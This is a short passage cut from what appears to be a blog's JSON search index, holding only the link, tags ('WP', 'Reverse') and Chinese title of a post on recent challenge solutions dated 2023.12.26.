gut!\n","link":"https://jackgdn.github.io/post/%E8%BF%91%E6%9C%9F%E8%A7%A3%E9%A2%98_20231226/","section":"post","tags":["WP","Reverse"],"title":"近期解题 2023.12.26"}]